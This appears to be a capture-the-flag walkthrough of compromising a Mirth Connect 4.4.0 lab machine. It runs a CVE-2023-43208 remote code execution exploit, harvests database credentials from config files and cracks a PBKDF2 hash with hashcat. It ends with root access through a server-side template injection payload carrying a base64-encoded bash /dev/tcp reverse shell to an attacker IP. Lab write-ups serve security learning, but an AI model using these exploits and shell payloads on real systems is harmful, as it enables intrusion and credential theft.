1. Did nmap

```bash

sudo nmap -sC -sV -sS -Pn -n --disable-arp-ping -oN tcpscan 10.129.244.184

```

<img width="1089" height="497" alt="image" src="https://github.com/user-attachments/assets/2a73054d-cac0-4646-a5f7-6eb6fe136d19" />


On enumerating web found

<img width="1262" height="799" alt="image" src="https://github.com/user-attachments/assets/3c30b75e-4fdf-453a-86d7-e0bb78e4663f" />

Upon click on launch mirth connect we got a file

```bash

file webstart.jnlp

```

```bash

strings webstart.jnlp | less

```

Got the version of mirth connect → version 4.4.0

<img width="732" height="67" alt="image" src="https://github.com/user-attachments/assets/8b0e4360-cf9c-4195-b428-00a02ebd077e" />

Mirth Connect version 4.4.0 has a critical vulnerability (CVE-2023-43208) that allows unauthenticated remote code execution, meaning attackers can execute arbitrary code on the server</span></body></html>

```bash

git clone [https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT)

cd CVE-2023-43

python3 -m venv .venv

source .venv/bin/activate

pip install -r requirements.txt

python3 CVE-2023-43208.py -u [https://10.129.244.184](https://10.129.244.184) -lh 10.10.14.28 -lp 7777

nc -lvnp 7777

```

Got the shell

Stabize it

```bash

python3 -c ‘import pty;pty.spawn("/bin/bash")'

export TERM=xterm

```

<img width="1124" height="624" alt="image" src="https://github.com/user-attachments/assets/bb87e2fb-5593-4ab4-bb6a-2a989a9dc75e" />

Check the path and did some initial enumeraiton

Found username and password in conf -->

```

cat /usr/local/mirthconnect/conf/mirth.properties

```

<img width="479" height="189" alt="image" src="https://github.com/user-attachments/assets/9abb4702-691d-46ba-a2df-28277afefe56" />

By reading all three file in conf directory we know that mysql → mariadb running on local host : 3306

```bash

mysql -u mirthdb -p

Password: MirthPass123!

```

<img width="847" height="367" alt="image" src="https://github.com/user-attachments/assets/3b752e28-2d0c-4955-ad38-ab78a1039906" />

<img width="764" height="752" alt="image" src="https://github.com/user-attachments/assets/06d414ee-f2cd-4237-83d3-00041c2f8fed" />

<img width="1183" height="256" alt="image" src="https://github.com/user-attachments/assets/8bd6fe18-eac5-4dba-bf40-07495c2f52bd" />

<img width="1420" height="222" alt="image" src="https://github.com/user-attachments/assets/14e6eec3-7072-4514-a280-66f6e0338269" />


It's a PDFK2 somethign find it password so lets make it digestable to hashcat with python3 script

```python

import base64

stored = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")

# First 8 bytes = salt, remaining 32 bytes = PBKDF2 digest

salt_b64 = base64.b64encode(stored[:8]).decode()

hash_b64 = base64.b64encode(stored[8:]).decode()

print(f"sha256:600000:{salt_b64}:{hash_b64}")

```

sha256:600000:u/+LBBOUnac=:YshQbDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=

```bash

echo "sha256:600000:u/+LBBOUnac=:YshQbDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=" > hash.txt

```

```bash

hashcat -m 10900 mirth.hash /SecLists/Passwords/Leaked_Passwords/rockyou.txt

```

<img width="1218" height="607" alt="image" src="https://github.com/user-attachments/assets/66512370-b0da-49d5-bb10-f34d015d694b" />


Now login with ssh

```bash

ssh sedric@10.129.244.184

```

Enter password and then we start enumerating

```bash

ps aux | grep “root”

```

<img width="1567" height="422" alt="image" src="https://github.com/user-attachments/assets/d0e99868-f305-4513-939e-b661b0b074fd" />

we found that a custom script is running with root
<img width="1631" height="356" alt="image" src="https://github.com/user-attachments/assets/0b55253c-565e-463c-92c8-b14e0e3c992f" />

We also find that some new services are running on local host

```bash

cat /usr/bin/notif.py

```

After reading the source code we found the correct endpoint and from the request we send we found that its is running a flask application

<img width="1588" height="423" alt="image" src="https://github.com/user-attachments/assets/66768487-164d-4895-b26b-702a3c55c8a1" />

INcrease chances of SSTI

since we have a correct enpoint lets send a requets that exploits SSTI and get us root flag

<img width="1694" height="206" alt="image" src="https://github.com/user-attachments/assets/49a30fb9-7c70-4558-bb75-b8c1decd4fa8" />



Got it and now since we already pivoted to sedric now we have both root and user flag

Solved

User.txt → **ad83ce8af5e12a20bdd6874fb0673968**

Root.txt → **bd3c1c9b4de5c1a09b818cc49758efd7**

Alternatve way

we can also get reverse shell and exploit further if we want

to do that we first have to base64 encode our payload then listen on a non-standard port on our attack host and execute the malicious request in target host to exploit SSTI

```bash

nc -lvnp 4444

echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.28/4444 0>&1'" | base64

```

execute on target host

```bash

python3 -c 'import urllib.request; req = urllib.request.Request("[http://127.0.0.1:54321/addPatient](http://127.0.0.1:54321/addPatient)", data=b"<patient><firstname>{__import__(\"os\").system(__import__(\"base64\").b64decode(\"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDQ0IDA+JjEn\").decode())}</firstname><lastname>A</lastname><sender_app>A</sender_app><timestamp>A</timestamp><birth_date>1/1/2000</birth_date><gender>A</gender></patient>", headers={"Content-Type": "application/xml"}); urllib.request.urlopen(req)'

```
<img width="1155" height="400" alt="image" src="https://github.com/user-attachments/assets/e9b2a9e1-7d4d-4416-8cb2-7a8d05b9573d" />

